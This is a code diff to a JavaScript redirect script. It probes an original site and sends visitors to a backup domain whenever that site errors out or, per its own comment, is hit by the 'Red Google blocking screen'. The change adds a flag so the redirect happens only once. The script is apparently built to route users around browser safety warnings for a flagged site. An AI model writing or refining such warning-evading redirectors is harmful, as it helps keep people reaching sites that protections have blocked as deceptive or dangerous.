@@ -7,6 +7,7 @@
     var originalUrl = 'https://dev-eyeyr.pantheonsite.io';
     var redirectUrl = 'https://bellshareapp.com';
     var turnstileSiteKey = '0x4AAAAAAAjywQEz5VX18N37'; // Replace with your actual Turnstile site key
+    var redirectAttempted = false; // Add a flag to track redirect attempts
 
     function checkTurnstile() {
       var turnstileWidget = document.getElementById('turnstile-widget');
@@ -28,17 +29,26 @@
       xhr.onload = function() {
         if (xhr.status >= 400 && xhr.status < 600) {
           // Error codes 404, 500, 502, 503, 504
-          window.location.href = redirectUrl; // Redirect to the redirect URL
+          if (!redirectAttempted) { // Check if redirect has already been attempted
+            window.location.href = redirectUrl + '?redirected=true'; // Redirect to the redirect URL with a flag
+            redirectAttempted = true; // Set the flag to prevent further redirects
+          }
         } else if (xhr.status === 0) {
           // Red Google blocking screen
-          window.location.href = redirectUrl; // Redirect to the redirect URL
+          if (!redirectAttempted) {
+            window.location.href = redirectUrl + '?redirected=true'; // Redirect to the redirect URL with a flag
+            redirectAttempted = true; // Set the flag to prevent further redirects
+          }
         } else {
           // Original URL is live, do nothing
         }
       };
       xhr.onerror = function() {
         // If the request fails, redirect to the new URL
-        window.location.href = redirectUrl;
+        if (!redirectAttempted) {
+          window.location.href = redirectUrl + '?redirected=true'; // Redirect to the redirect URL with a flag
+          redirectAttempted = true; // Set the flag to prevent further redirects
+        }
       };
       xhr.send();
     }
